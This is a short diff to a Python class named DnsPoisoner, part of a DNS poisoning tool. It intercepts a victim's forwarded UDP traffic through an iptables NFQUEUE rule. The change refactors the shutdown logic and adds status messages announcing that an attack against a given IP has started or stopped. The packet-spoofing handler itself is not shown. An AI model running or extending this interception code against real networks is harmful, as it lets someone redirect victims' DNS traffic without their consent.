@@ -14,7 +14,7 @@ class DnsPoisoner(multiprocessing.Process):
         #Create rules on how to handles packets destined for your LAN
         self.iprule_add    = "iptables -I FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)    #packets matching this rule get send to queue_num
         self.iprule_remove = "iptables -D FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)    #Restores original ip rule
-        self.exit          = False
+        self.exit          = multiprocessing.Event()
 
         #Initialize queue identified by queue_num and specify that the packets are passed as arguments of handle_packet()
         self.queue.bind(queue_num, self.handle_packet) 
@@ -49,12 +49,16 @@ class DnsPoisoner(multiprocessing.Process):
         os.system(self.iprule_add)    #make sure DNS packets are intercepted
         self.queue.run()    #queue starts accepting packages
 
-        while not self.exit:
+        print "DNS poisoning attack against {} started".format(self.ip)
+
+        while not self.exit.is_set():
             time.sleep(1)
 
+        os.system(self.iprule_remove)    #make sure DNS packets are not intercepted anymore
         self.queue.unbind()    #delete queue
+
+        print "DNS poisoning attack against {} stopped".format(self.ip)
 
     def stop(self):
 
-        os.system(self.iprule_remove)    #make sure DNS packets are not intercepted anymore
-        self.exit = True
+        self.exit.set()
